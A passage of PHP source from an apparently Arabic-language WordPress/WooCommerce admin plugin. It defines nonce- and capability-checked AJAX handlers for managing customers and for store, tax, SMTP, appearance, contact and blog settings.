        wp_send_json_error( 'غير مصرح' );
    }

    $page = isset( $_GET['page_num'] ) ? absint( $_GET['page_num'] ) : 1;
    $api  = new Yamamah_API();
    $data = $api->get_products( $page, 20 );

    wp_send_json_success( $data );
}

add_action( 'wp_ajax_yamamah_get_customers', 'yamamah_ajax_get_customers' );
function yamamah_ajax_get_customers() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $api  = new Yamamah_API();
    $data = $api->get_customers();

    wp_send_json_success( $data );
}

add_action( 'wp_ajax_yamamah_get_customer', 'yamamah_ajax_get_customer' );
function yamamah_ajax_get_customer() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $user_id = absint( $_REQUEST['user_id'] ?? $_REQUEST['customer_id'] ?? 0 );
    $user    = get_userdata( $user_id );
    if ( ! $user ) {
        wp_send_json_error( array( 'message' => 'العميل غير موجود.' ) );
    }

    $wc_customer = class_exists( 'WC_Customer' ) ? new WC_Customer( $user_id ) : null;
    $last_login  = get_user_meta( $user_id, 'last_login', true );
    $thirty      = strtotime( '-30 days' );
    $is_active   = $last_login && strtotime( $last_login ) >= $thirty;

    wp_send_json_success(
        array(
            'id'           => $user->ID,
            'name'         => $user->display_name,
            'email'        => $user->user_email,
            'first_name'   => get_user_meta( $user_id, 'first_name', true ) ?: '',
            'last_name'    => get_user_meta( $user_id, 'last_name', true ) ?: '',
            'phone'        => get_user_meta( $user_id, 'billing_phone', true ) ?: '',
            'registered'   => $user->user_registered,
            'last_login'   => $last_login ?: '',
            'is_active'    => (bool) $is_active,
            'orders'       => $wc_customer ? $wc_customer->get_order_count() : 0,
            'spent'        => $wc_customer ? $wc_customer->get_total_spent() : 0,
            'spent_raw'    => $wc_customer ? $wc_customer->get_total_spent() : 0,
        )
    );
}

add_action( 'wp_ajax_yamamah_save_customer', 'yamamah_ajax_save_customer' );
function yamamah_ajax_save_customer() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $user_id      = absint( $_POST['user_id'] ?? $_POST['customer_id'] ?? 0 );
    $display_name = sanitize_text_field( wp_unslash( $_POST['name'] ?? $_POST['display_name'] ?? '' ) );
    $first_name   = sanitize_text_field( wp_unslash( $_POST['first_name'] ?? '' ) );
    $last_name    = sanitize_text_field( wp_unslash( $_POST['last_name'] ?? '' ) );
    $email        = sanitize_email( $_POST['email'] ?? '' );
    $phone        = sanitize_text_field( $_POST['phone'] ?? '' );
    $password     = (string) ( $_POST['password'] ?? '' );

    if ( ! $user_id ) {
        wp_send_json_error( array( 'message' => 'معرّف العميل مطلوب.' ) );
    }
    if ( $display_name === '' ) {
        wp_send_json_error( array( 'message' => 'الاسم مطلوب.' ) );
    }
    if ( $email === '' || ! is_email( $email ) ) {
        wp_send_json_error( array( 'message' => 'البريد الإلكتروني غير صالح.' ) );
    }

    $existing = email_exists( $email );
    if ( $existing && (int) $existing !== $user_id ) {
        wp_send_json_error( array( 'message' => 'البريد الإلكتروني مستخدم من حساب آخر.' ) );
    }

    $user = get_userdata( $user_id );
    if ( ! $user ) {
        wp_send_json_error( array( 'message' => 'العميل غير موجود.' ) );
    }

    $update = array(
        'ID'           => $user_id,
        'display_name' => $display_name,
        'first_name'   => $first_name,
        'last_name'    => $last_name,
        'user_email'   => $email,
    );
    if ( $password !== '' ) {
        if ( strlen( $password ) < 6 ) {
            wp_send_json_error( array( 'message' => 'كلمة المرور يجب أن تكون 6 أحرف على الأقل.' ) );
        }
        $update['user_pass'] = $password;
    }

    $result = wp_update_user( $update );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    update_user_meta( $user_id, 'billing_phone', $phone );
    if ( $first_name !== '' ) {
        update_user_meta( $user_id, 'billing_first_name', $first_name );
    }
    if ( $last_name !== '' ) {
        update_user_meta( $user_id, 'billing_last_name', $last_name );
    }
    if ( $email !== '' ) {
        update_user_meta( $user_id, 'billing_email', $email );
    }

    wp_send_json_success( array( 'message' => 'تم تحديث بيانات العميل بنجاح.' ) );
}

add_action( 'wp_ajax_yamamah_delete_customer', 'yamamah_ajax_delete_customer' );
function yamamah_ajax_delete_customer() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $user_id = absint( $_POST['user_id'] ?? $_POST['customer_id'] ?? 0 );
    if ( ! $user_id || $user_id === get_current_user_id() ) {
        wp_send_json_error( array( 'message' => 'لا يمكن حذف هذا المستخدم.' ) );
    }

    $user = get_userdata( $user_id );
    if ( ! $user ) {
        wp_send_json_error( array( 'message' => 'العميل غير موجود.' ) );
    }

    $admin_roles = array( 'administrator', 'shop_manager', 'editor' );
    if ( array_intersect( $admin_roles, (array) $user->roles ) ) {
        wp_send_json_error( array( 'message' => 'لا يمكن حذف حساب إداري من صفحة العملاء.' ) );
    }

    require_once ABSPATH . 'wp-admin/includes/user.php';
    $result = wp_delete_user( $user_id );
    if ( $result ) {
        wp_send_json_success( array( 'message' => 'تم حذف العميل بنجاح.' ) );
    }
    wp_send_json_error( array( 'message' => 'فشل حذف العميل.' ) );
}

add_action( 'wp_ajax_yamamah_submit_support', 'yamamah_ajax_submit_support' );
function yamamah_ajax_submit_support() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $type     = sanitize_text_field( $_POST['support_type'] ?? '' );
    $priority = sanitize_text_field( $_POST['support_priority'] ?? 'عادية' );
    $subject  = sanitize_text_field( $_POST['support_subject'] ?? '' );
    $message  = sanitize_textarea_field( $_POST['support_message'] ?? '' );

    if ( empty( $type ) || empty( $message ) ) {
        wp_send_json_error( 'يرجى ملء جميع الحقول المطلوبة' );
    }

    $current_user = wp_get_current_user();
    $admin_email  = get_option( 'admin_email' );
    $store_name   = get_option( 'yamamah_store_name', get_bloginfo( 'name' ) );

    $email_subject = sprintf( '[%s] طلب دعم فني: %s', $store_name, $subject ?: $type );
    $email_body    = "نوع الطلب: {$type}\n";
    $email_body   .= "الأولوية: {$priority}\n";
    $email_body   .= "الموضوع: {$subject}\n\n";
    $email_body   .= "الرسالة:\n{$message}\n\n";
    $email_body   .= "---\n";
    $email_body   .= "المرسل: {$current_user->display_name} ({$current_user->user_email})\n";
    $email_body   .= "المتجر: {$store_name}\n";
    $email_body   .= "الرابط: " . home_url() . "\n";

    $headers = array( 'Content-Type: text/plain; charset=UTF-8' );
    $sent = wp_mail( $admin_email, $email_subject, $email_body, $headers );

    if ( $sent ) {
        wp_send_json_success( 'تم إرسال طلب الدعم بنجاح' );
    } else {
        wp_send_json_success( 'تم تسجيل طلبك (قد لا يتم إرسال البريد في بيئة التطوير)' );
    }
}

add_action( 'wp_ajax_yamamah_toggle_dark_mode', 'yamamah_ajax_toggle_dark_mode' );
function yamamah_ajax_toggle_dark_mode() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }
    $dark = sanitize_text_field( $_POST['dark'] ?? 'no' );
    update_option( 'yamamah_dark_mode', $dark === 'yes' ? 'yes' : 'no' );
    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_save_settings', 'yamamah_ajax_save_settings' );
function yamamah_ajax_save_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) && ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $allowed_keys = array(
        'yamamah_store_name', 'yamamah_store_email', 'yamamah_store_phone',
        'yamamah_store_currency', 'yamamah_tax_enabled', 'yamamah_tax_rate', 'yamamah_tax_mode',
        'yamamah_primary_color', 'yamamah_secondary_color', 'yamamah_dark_mode',
        'blogdescription',
        'woocommerce_default_country', 'woocommerce_store_city', 'woocommerce_store_address',
        'woocommerce_currency', 'woocommerce_currency_pos',
        'woocommerce_price_thousand_sep', 'woocommerce_price_decimal_sep',
        'woocommerce_price_num_decimals',
    );

    $settings = isset( $_POST['settings'] ) ? wp_unslash( $_POST['settings'] ) : array();
    if ( ! is_array( $settings ) ) {
        $settings = array();
    }

    // تطبيع قيمة التفعيل إن وصلت كمصفوفة (hidden + checkbox).
    if ( isset( $settings['yamamah_tax_enabled'] ) && is_array( $settings['yamamah_tax_enabled'] ) ) {
        $settings['yamamah_tax_enabled'] = in_array( 'yes', $settings['yamamah_tax_enabled'], true ) ? 'yes' : 'no';
    }
    if ( isset( $settings['yamamah_tax_enabled'] ) ) {
        $settings['yamamah_tax_enabled'] = ( 'yes' === $settings['yamamah_tax_enabled'] ) ? 'yes' : 'no';
    }

    foreach ( $settings as $key => $value ) {
        if ( in_array( $key, $allowed_keys, true ) ) {
            if ( is_array( $value ) ) {
                $value = end( $value );
            }
            update_option( sanitize_key( $key ), sanitize_text_field( (string) $value ) );
        }
    }

    // مزامنة العملة مع WooCommerce
    if ( isset( $settings['yamamah_store_currency'] ) ) {
        update_option( 'woocommerce_currency', sanitize_text_field( (string) $settings['yamamah_store_currency'] ) );
    }

    // مزامنة الضريبة مع WooCommerce (تفعيل + نسبة + متضمنة/غير متضمنة).
    if ( isset( $settings['yamamah_tax_enabled'] ) || isset( $settings['yamamah_tax_rate'] ) || isset( $settings['yamamah_tax_mode'] ) ) {
        $tax_enabled = isset( $settings['yamamah_tax_enabled'] ) ? (string) $settings['yamamah_tax_enabled'] : null;
        if ( null !== $tax_enabled ) {
            $tax_enabled = ( 'yes' === $tax_enabled ) ? 'yes' : 'no';
            update_option( 'yamamah_tax_enabled', $tax_enabled );
            update_option( 'woocommerce_calc_taxes', $tax_enabled );
        }
        if ( function_exists( 'yamamah_sync_store_tax_to_woocommerce' ) ) {
            yamamah_sync_store_tax_to_woocommerce(
                $tax_enabled,
                isset( $settings['yamamah_tax_rate'] ) ? (float) $settings['yamamah_tax_rate'] : null,
                isset( $settings['yamamah_tax_mode'] ) ? sanitize_text_field( (string) $settings['yamamah_tax_mode'] ) : null
            );
        }
    }

    wp_send_json_success( 'تم الحفظ بنجاح' );
}

add_action( 'wp_ajax_yamamah_get_store_settings', 'yamamah_ajax_get_store_settings' );
function yamamah_ajax_get_store_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) && ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $section = sanitize_key( (string) ( $_REQUEST['section'] ?? 'all' ) );

    $tracking = get_option( 'yamamah_tracking_settings', array() );
    if ( ! is_array( $tracking ) ) {
        $tracking = array();
    }

    $sms_enabled   = get_option( 'yamama_sms_enabled', 'no' );
    $monthly_limit = (int) get_option( 'yamama_sms_monthly_limit', 0 );
    $usage         = 0;
    if ( class_exists( 'Yamamah_SMS_Manager' ) && method_exists( 'Yamamah_SMS_Manager', 'get_monthly_usage' ) ) {
        $usage = (int) Yamamah_SMS_Manager::get_monthly_usage();
    }

    $plan_features = get_option( 'yamama_plan_features', array() );
    if ( is_string( $plan_features ) ) {
        $plan_features = json_decode( $plan_features, true ) ?: array();
    }
    $domain_allowed = ! empty( $plan_features['custom_domain'] );
    if ( function_exists( 'yamamah_plan_allows' ) ) {
        $domain_allowed = yamamah_plan_allows( 'custom_domain' );
    }
    $sms_allowed = $sms_enabled === 'yes';
    if ( function_exists( 'yamamah_plan_allows' ) ) {
        $sms_allowed = yamamah_plan_allows( 'sms' ) && $sms_enabled === 'yes';
    }

    $payload = array(
        'general'  => array(
            'yamamah_store_name'  => get_option( 'yamamah_store_name', get_bloginfo( 'name' ) ),
            'blogdescription'     => get_bloginfo( 'description' ),
            'yamamah_store_email' => get_option( 'yamamah_store_email', get_option( 'admin_email' ) ),
            'yamamah_store_phone' => get_option( 'yamamah_store_phone', '' ),
        ),
        'store'    => array(
            'woocommerce_default_country' => get_option( 'woocommerce_default_country', 'SA' ),
            'woocommerce_store_city'      => get_option( 'woocommerce_store_city', '' ),
            'woocommerce_store_address'   => get_option( 'woocommerce_store_address', '' ),
        ),
        'currency' => array(
            'yamamah_store_currency'          => get_option( 'yamamah_store_currency', get_option( 'woocommerce_currency', 'SAR' ) ),
            'woocommerce_currency_pos'        => get_option( 'woocommerce_currency_pos', 'right_space' ),
            'woocommerce_price_thousand_sep'  => get_option( 'woocommerce_price_thousand_sep', ',' ),
            'woocommerce_price_decimal_sep'   => get_option( 'woocommerce_price_decimal_sep', '.' ),
            'woocommerce_price_num_decimals'  => get_option( 'woocommerce_price_num_decimals', 2 ),
        ),
        'tax'      => array(
            'yamamah_tax_enabled' => get_option( 'yamamah_tax_enabled', 'yes' ),
            'yamamah_tax_rate'    => get_option( 'yamamah_tax_rate', 15 ),
        ),
        'email'    => array(
            'settings' => array(
                'woocommerce_email_from_name'    => get_option( 'woocommerce_email_from_name', get_bloginfo( 'name' ) ),
                'woocommerce_email_from_address' => get_option( 'woocommerce_email_from_address', get_option( 'admin_email' ) ),
                'woocommerce_email_footer_text'  => get_option( 'woocommerce_email_footer_text', '' ),
                'woocommerce_email_base_color'   => get_option( 'woocommerce_email_base_color', '#7f54b3' ),
            ),
            'smtp'     => array(
                'yamamah_smtp_enabled'    => get_option( 'yamamah_smtp_enabled', 'no' ),
                'yamamah_smtp_host'       => get_option( 'yamamah_smtp_host', '' ),
                'yamamah_smtp_port'       => get_option( 'yamamah_smtp_port', '587' ),
                'yamamah_smtp_encryption' => get_option( 'yamamah_smtp_encryption', 'tls' ),
                'yamamah_smtp_username'   => get_option( 'yamamah_smtp_username', '' ),
                'has_password'            => get_option( 'yamamah_smtp_password', '' ) !== '',
            ),
            'can_custom_email' => get_option( 'yamama_email_custom_domain', 'no' ) === 'yes',
            'custom_domain'    => get_option( 'yamama_custom_domain', '' ),
        ),
        'tracking' => $tracking,
        'sms'      => array(
            'allowed'         => (bool) $sms_allowed,
            'enabled'         => $sms_enabled,
            'otp_login'       => get_option( 'yamama_otp_login', 'no' ),
            'otp_register'    => get_option( 'yamama_otp_register', 'no' ),
            'provider'        => get_option( 'yamama_sms_provider', 'platform' ),
            'can_own'         => get_option( 'yamama_sms_can_own_gateway', 'no' ) === 'yes',
            'custom_token'    => get_option( 'yamama_sms_custom_token', '' ),
            'custom_sender'   => get_option( 'yamama_sms_custom_sender', '' ),
            'monthly_limit'   => $monthly_limit,
            'usage'           => $usage,
        ),
        'domain'   => array(
            'allowed'       => (bool) $domain_allowed,
            'current_url'   => home_url(),
            'custom_domain' => get_option( 'yamama_custom_domain', '' ),
            'status'        => get_option( 'yamama_domain_status', '' ),
            'dns_ip'        => get_option( 'yamama_dns_target_ip', '' ),
            'store_linked'  => get_option( 'yamama_store_id', '' ) !== '' && get_option( 'yamama_factory_url', '' ) !== '',
        ),
    );

    if ( $section !== 'all' && isset( $payload[ $section ] ) ) {
        wp_send_json_success( array( 'section' => $section, 'data' => $payload[ $section ] ) );
    }

    wp_send_json_success( $payload );
}

add_action( 'wp_ajax_yamamah_get_appearance_settings', 'yamamah_ajax_get_appearance_settings' );
function yamamah_ajax_get_appearance_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) && ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $section  = sanitize_key( (string) ( $_REQUEST['section'] ?? 'all' ) );
    $manifest = apply_filters( 'ydash_theme_manifest', array() );
    if ( ! is_array( $manifest ) ) {
        $manifest = array();
    }

    $appearance_fields = isset( $manifest['appearance_fields'] ) && is_array( $manifest['appearance_fields'] )
        ? $manifest['appearance_fields']
        : array( 'header_logo', 'footer_logo', 'favicon' );

    $theme_logo_url = apply_filters( 'ydash_get_logo', '' );
    $theme_icon_url = apply_filters( 'ydash_get_favicon', '' );
    $header_id      = (int) get_option( 'yamamah_header_logo', 0 );
    $footer_id      = (int) get_option( 'yamamah_footer_logo', 0 );
    $favicon_id     = (int) get_option( 'yamamah_favicon', 0 );

    $general = array(
        'fields' => $appearance_fields,
        'header' => array(
            'id'  => $header_id,
            'url' => $header_id ? wp_get_attachment_url( $header_id ) : $theme_logo_url,
        ),
        'footer' => array(
            'id'  => $footer_id,
            'url' => $footer_id ? wp_get_attachment_url( $footer_id ) : $theme_logo_url,
        ),
        'favicon' => array(
            'id'  => $favicon_id,
            'url' => $favicon_id ? wp_get_attachment_url( $favicon_id ) : $theme_icon_url,
        ),
    );

    $home_content = apply_filters( 'ydash_get_homepage_settings', array() );
    if ( ! is_array( $home_content ) ) {
        $home_content = array();
    }
    $home_fields = array();
    $text_map    = array(
        'title'    => array( 'label' => 'العنوان', 'type' => 'text' ),
        'text'     => array( 'label' => 'النص', 'type' => 'textarea' ),
        'desc'     => array( 'label' => 'الوصف', 'type' => 'textarea' ),
        'btn_text' => array( 'label' => 'نص الزر', 'type' => 'text' ),
    );
    $hero_config = isset( $manifest['hero_config'] ) ? $manifest['hero_config'] : null;
    if ( is_array( $hero_config ) && ! empty( $hero_config['slides'] ) && is_array( $hero_config['slides'] ) ) {
        foreach ( $hero_config['slides'] as $slide ) {
            if ( ! is_array( $slide ) || empty( $slide['key'] ) ) {
                continue;
            }
            $skey   = (string) $slide['key'];
            $fields = isset( $slide['fields'] ) && is_array( $slide['fields'] ) ? $slide['fields'] : array( 'image' );
            $group  = (string) ( $slide['label'] ?? $skey );
            if ( in_array( 'image', $fields, true ) ) {
                $ikey = $skey . '_image';
                $iid  = (int) ( $home_content[ $ikey ] ?? 0 );
                $home_fields[] = array(
                    'key'   => $ikey,
                    'label' => $group . ' — الصورة',
                    'type'  => 'image',
                    'group' => $group,
                    'value' => $iid,
                    'url'   => $iid ? wp_get_attachment_image_url( $iid, 'medium' ) : '',
                );
            }
            foreach ( $text_map as $fkey => $fconfig ) {
                if ( ! in_array( $fkey, $fields, true ) ) {
                    continue;
                }
                $full = $skey . '_' . $fkey;
                $home_fields[] = array(
                    'key'   => $full,
                    'label' => $group . ' — ' . $fconfig['label'],
                    'type'  => $fconfig['type'],
                    'group' => $group,
                    'value' => isset( $home_content[ $full ] ) ? (string) $home_content[ $full ] : '',
                );
            }
        }
    } else {
        foreach ( array(
            array( 'key' => 'header_image', 'label' => 'صورة الهيدر', 'type' => 'image' ),
            array( 'key' => 'header_title', 'label' => 'عنوان الهيدر', 'type' => 'text' ),
            array( 'key' => 'header_text', 'label' => 'نص الهيدر', 'type' => 'textarea' ),
            array( 'key' => 'header_btn_text', 'label' => 'نص زر الهيدر', 'type' => 'text' ),
        ) as $f ) {
            if ( $f['type'] === 'image' ) {
                $iid = (int) ( $home_content[ $f['key'] ] ?? 0 );
                $f['value'] = $iid;
                $f['url']   = $iid ? wp_get_attachment_image_url( $iid, 'medium' ) : '';
            } else {
                $f['value'] = isset( $home_content[ $f['key'] ] ) ? (string) $home_content[ $f['key'] ] : '';
            }
            $f['group'] = 'الهيدر';
            $home_fields[] = $f;
        }
    }

    $section_headings = isset( $manifest['section_headings'] ) && is_array( $manifest['section_headings'] ) ? $manifest['section_headings'] : array();
    foreach ( $section_headings as $hkey => $hlabel ) {
        $home_fields[] = array(
            'key'   => (string) $hkey,
            'label' => (string) $hlabel,
            'type'  => 'text',
            'group' => 'عناوين الأقسام',
            'value' => isset( $home_content[ $hkey ] ) ? (string) $home_content[ $hkey ] : '',
        );
    }

    $extra_fields = isset( $manifest['extra_image_fields'] ) && is_array( $manifest['extra_image_fields'] ) ? $manifest['extra_image_fields'] : array();
    foreach ( $extra_fields as $ef ) {
        if ( ! is_array( $ef ) || empty( $ef['key'] ) ) {
            continue;
        }
        $ef_key  = (string) $ef['key'];
        $ef_type = isset( $ef['type'] ) ? (string) $ef['type'] : ( strpos( $ef_key, 'image' ) !== false ? 'image' : 'text' );
        if ( $ef_type === 'image' ) {
            $iid = (int) ( $home_content[ $ef_key ] ?? 0 );
            $home_fields[] = array(
                'key'   => $ef_key,
                'label' => (string) ( $ef['label'] ?? $ef_key ),
                'type'  => 'image',
                'group' => 'عناصر إضافية',
                'value' => $iid,
                'url'   => $iid ? wp_get_attachment_image_url( $iid, 'medium' ) : '',
            );
        } else {
            $home_fields[] = array(
                'key'   => $ef_key,
                'label' => (string) ( $ef['label'] ?? $ef_key ),
                'type'  => 'text',
                'group' => 'عناصر إضافية',
                'value' => isset( $home_content[ $ef_key ] ) ? (string) $home_content[ $ef_key ] : '',
            );
        }
    }

    $color_fields = isset( $manifest['color_fields'] ) && is_array( $manifest['color_fields'] )
        ? $manifest['color_fields']
        : array(
            'button_primary'    => 'لون الأزرار الرئيسي',
            'header_background' => 'خلفية الهيدر',
            'footer_background' => 'خلفية الفوتر',
        );
    $colors = apply_filters( 'ydash_get_color_settings', array() );
    if ( ! is_array( $colors ) ) {
        $colors = array();
    }
    $defaults = apply_filters( 'ydash_get_default_colors', array() );
    if ( ! is_array( $defaults ) ) {
        $defaults = array();
    }
    foreach ( $color_fields as $ck => $clabel ) {
        if ( empty( $colors[ $ck ] ) ) {
            $colors[ $ck ] = isset( $defaults[ $ck ] ) ? (string) $defaults[ $ck ] : '#000000';
        }
    }

    $policy_map  = apply_filters( 'ydash_policy_pages', array() );
    $policy_rows = array();
    if ( is_array( $policy_map ) ) {
        foreach ( $policy_map as $slug => $label ) {
            $page = get_page_by_path( (string) $slug );
            $policy_rows[] = array(
                'slug'    => (string) $slug,
                'label'   => (string) $label,
                'page_id' => $page ? (int) $page->ID : 0,
                'title'   => $page ? (string) $page->post_title : (string) $label,
                'content' => $page ? (string) $page->post_content : '',
                'exists'  => (bool) $page,
            );
        }
    }

    $contact_manifest = apply_filters( 'ydash_contact_page_manifest', array() );
    if ( ! is_array( $contact_manifest ) ) {
        $contact_manifest = array();
    }
    $contact_content = apply_filters( 'ydash_get_contact_page_settings', array() );
    if ( ! is_array( $contact_content ) ) {
        $contact_content = array();
    }
    $floating = apply_filters( 'ydash_get_floating_buttons', array() );
    if ( ! is_array( $floating ) ) {
        $floating = array();
    }
    $social = get_option( 'yamamah_social_links', array() );
    if ( ! is_array( $social ) ) {
        $social = array();
    }

    $contact_fields = array();
    foreach ( $contact_manifest as $ck => $clabel ) {
        $ck = (string) $ck;
        if ( strpos( $ck, 'footer_' ) === 0 ) {
            continue;
        }
        $contact_fields[] = array(
            'key'   => $ck,
            'label' => (string) $clabel,
            'value' => isset( $contact_content[ $ck ] ) ? (string) $contact_content[ $ck ] : '',
        );
    }

    $payload = array(
        'general' => $general,
        'home'    => array(
            'theme_name' => isset( $manifest['theme_name'] ) ? (string) $manifest['theme_name'] : '',
            'fields'     => $home_fields,
            'values'     => $home_content,
        ),
        'colors'  => array(
            'fields'   => $color_fields,
            'colors'   => $colors,
            'defaults' => $defaults,
        ),
        'policies' => array( 'items' => $policy_rows ),
        'contact'  => array(
            'recipient' => get_option( 'yamamah_contact_form_recipient', get_option( 'admin_email' ) ),
            'smtp'      => array(
                'yamamah_smtp_enabled'    => get_option( 'yamamah_smtp_enabled', 'no' ),
                'yamamah_smtp_host'       => get_option( 'yamamah_smtp_host', '' ),
                'yamamah_smtp_port'       => get_option( 'yamamah_smtp_port', '587' ),
                'yamamah_smtp_encryption' => get_option( 'yamamah_smtp_encryption', 'tls' ),
                'yamamah_smtp_username'   => get_option( 'yamamah_smtp_username', '' ),
                'has_password'            => get_option( 'yamamah_smtp_password', '' ) !== '',
            ),
            'floating'  => array(
                'yamamah_floating_wa_enabled'   => ! empty( $floating['wa_enabled'] ) ? (string) $floating['wa_enabled'] : 'no',
                'yamamah_floating_wa_number'    => isset( $floating['wa_number'] ) ? (string) $floating['wa_number'] : '',
                'yamamah_floating_call_enabled' => ! empty( $floating['call_enabled'] ) ? (string) $floating['call_enabled'] : 'no',
                'yamamah_floating_call_number'  => isset( $floating['call_number'] ) ? (string) $floating['call_number'] : '',
            ),
            'social'    => $social,
            'fields'    => $contact_fields,
            'content'   => $contact_content,
        ),
    );

    if ( $section !== 'all' && isset( $payload[ $section ] ) ) {
        wp_send_json_success( array( 'section' => $section, 'data' => $payload[ $section ] ) );
    }
    wp_send_json_success( $payload );
}

// ======== AJAX: Save Contact Settings ========
add_action( 'wp_ajax_yamamah_save_contact_page_settings', 'yamamah_ajax_save_contact_page_settings' );
function yamamah_ajax_save_contact_page_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح لك' );
    }

    $smtp_data = isset( $_POST['smtp'] ) ? (array) $_POST['smtp'] : array();
    if ( isset( $smtp_data['yamamah_contact_form_recipient'] ) ) {
        update_option( 'yamamah_contact_form_recipient', sanitize_email( $smtp_data['yamamah_contact_form_recipient'] ) );
    }
    if ( isset( $smtp_data['yamamah_smtp_enabled'] ) ) {
        update_option( 'yamamah_smtp_enabled', sanitize_text_field( $smtp_data['yamamah_smtp_enabled'] ) );
    }
    if ( isset( $smtp_data['yamamah_smtp_host'] ) ) {
        update_option( 'yamamah_smtp_host', sanitize_text_field( $smtp_data['yamamah_smtp_host'] ) );
    }
    if ( isset( $smtp_data['yamamah_smtp_port'] ) ) {
        update_option( 'yamamah_smtp_port', sanitize_text_field( $smtp_data['yamamah_smtp_port'] ) );
    }
    if ( isset( $smtp_data['yamamah_smtp_encryption'] ) ) {
        update_option( 'yamamah_smtp_encryption', sanitize_text_field( $smtp_data['yamamah_smtp_encryption'] ) );
    }
    if ( isset( $smtp_data['yamamah_smtp_username'] ) ) {
        update_option( 'yamamah_smtp_username', sanitize_text_field( $smtp_data['yamamah_smtp_username'] ) );
    }
    if ( ! empty( $smtp_data['yamamah_smtp_password'] ) ) {
        update_option( 'yamamah_smtp_password', sanitize_text_field( $smtp_data['yamamah_smtp_password'] ) );
    }

    $floating_data = isset( $_POST['floating'] ) ? (array) $_POST['floating'] : array();
    update_option( 'yamamah_floating_wa_enabled', sanitize_text_field( isset( $floating_data['yamamah_floating_wa_enabled'] ) ? $floating_data['yamamah_floating_wa_enabled'] : 'no' ) );
    update_option( 'yamamah_floating_wa_number', sanitize_text_field( isset( $floating_data['yamamah_floating_wa_number'] ) ? $floating_data['yamamah_floating_wa_number'] : '' ) );
    update_option( 'yamamah_floating_call_enabled', sanitize_text_field( isset( $floating_data['yamamah_floating_call_enabled'] ) ? $floating_data['yamamah_floating_call_enabled'] : 'no' ) );
    update_option( 'yamamah_floating_call_number', sanitize_text_field( isset( $floating_data['yamamah_floating_call_number'] ) ? $floating_data['yamamah_floating_call_number'] : '' ) );

    $social_data = isset( $_POST['social'] ) ? (array) wp_unslash( $_POST['social'] ) : array();
    $sanitized_social = array();
    foreach ( $social_data as $platform => $url ) {
        $clean_url = esc_url_raw( is_string( $url ) ? $url : '' );
        if ( $clean_url !== '' ) {
            $sanitized_social[ sanitize_key( $platform ) ] = $clean_url;
        }
    }
    update_option( 'yamamah_social_links', $sanitized_social );

    $footer_contact_raw = isset( $_POST['footer_contact'] ) ? (array) wp_unslash( $_POST['footer_contact'] ) : array();
    $sanitized_footer   = array();
    foreach ( $footer_contact_raw as $fk => $fv ) {
        $key = sanitize_key( $fk );
        if ( $key === '' ) {
            continue;
        }
        $sanitized_footer[ $key ] = is_string( $fv ) ? wp_kses_post( $fv ) : '';
    }
    do_action( 'ydash_save_footer_contact_settings', $sanitized_footer );

    $content_data = isset( $_POST['content'] ) ? (array) $_POST['content'] : array();
    $sanitized_content = array();
    foreach ( $content_data as $key => $value ) {
        $sanitized_content[ sanitize_key( $key ) ] = wp_kses_post( wp_unslash( $value ) );
    }
    do_action( 'ydash_save_contact_page_settings', $sanitized_content );

    wp_send_json_success();
}

// ======== AJAX: Save Blog Page Settings ========
add_action( 'wp_ajax_yamamah_save_blog_page_settings', 'yamamah_ajax_save_blog_page_settings' );
function yamamah_ajax_save_blog_page_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح لك' );
    }

    if ( ! function_exists( 'yamamah_theme_has_blog_settings' ) || ! yamamah_theme_has_blog_settings() ) {
        wp_send_json_error( 'الثيم الحالي لا يدعم إعدادات المدونة' );
    }

    $content_data = isset( $_POST['content'] ) ? (array) wp_unslash( $_POST['content'] ) : array();
    $sanitized    = function_exists( 'yamamah_sanitize_blog_page_content' )
        ? yamamah_sanitize_blog_page_content( $content_data )
        : array();

    do_action( 'ydash_save_blog_page_settings', $sanitized );

    wp_send_json_success();
}

// ======== AJAX: Blog Posts CRUD ========
add_action( 'wp_ajax_yamamah_save_blog_post', 'yamamah_ajax_save_blog_post' );
function yamamah_ajax_save_blog_post() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح لك' ) );
    }
    if ( ! function_exists( 'yamamah_theme_has_blog_settings' ) || ! yamamah_theme_has_blog_settings() ) {
        wp_send_json_error( array( 'message' => 'الثيم الحالي لا يدعم المدونة' ) );
    }

    $post_id = absint( $_POST['post_id'] ?? 0 );
    $title   = sanitize_text_field( wp_unslash( $_POST['title'] ?? '' ) );
    $content = wp_kses_post( wp_unslash( $_POST['content'] ?? '' ) );
    $excerpt = sanitize_textarea_field( wp_unslash( $_POST['excerpt'] ?? '' ) );
